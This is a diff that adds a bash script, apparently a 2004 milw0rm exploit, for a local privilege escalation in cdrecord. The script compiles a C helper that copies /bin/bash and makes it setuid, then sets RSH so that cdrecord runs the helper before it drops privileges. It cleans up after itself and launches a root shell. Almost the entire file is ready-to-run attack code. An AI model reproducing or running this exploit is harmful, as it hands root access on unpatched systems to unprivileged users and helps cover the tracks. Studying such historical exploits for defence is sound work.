@@ -1,0 +1,58 @@
+#!/bin/bash
+
+#
+# cdrecord-suidshell.sh - I)ruid [CAU] (09.2004)
+#
+# Exploits cdrecord's exec() of $RSH before dropping privs 
+#
+
+cat > ./cpbinbash.c << __EOF__
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main( int argc, char *argv[] ) {
+int fd1, fd2;
+int count;
+char buffer[1];
+
+/* Set ID's */
+setuid( geteuid() );
+setgid( geteuid() );
+
+/* Copy the shell */
+if ((fd1=open( "/bin/bash", O_RDONLY))<0)
+return -1;
+if ((fd2=open( "./bash", O_WRONLY|O_CREAT))<0)
+return -1;
+while((count=read(fd1, buffer, 1)))
+write(fd2, buffer, count);
+free(buffer);
+close( fd1 );
+close( fd2 );
+
+/* Priv the shell */
+chown( "./bash", geteuid(), geteuid() );
+chmod( "./bash", 3565 );
+}
+__EOF__
+
+cc ./cpbinbash.c -o ./cpbinbash
+
+# Set up environment
+export RSHSAVE=$RSH
+export RSH=./cpbinbash
+
+# Sploit
+cdrecord dev= REMOTE:CAU:1,0,0 -
+
+# Cleanup
+rm cpbinbash*
+export RSH=$RSHSAVE
+export RSHSAVE=
+
+# Use our suid bash
+./bash -p 
+
+// milw0rm.com [2004-09-11]
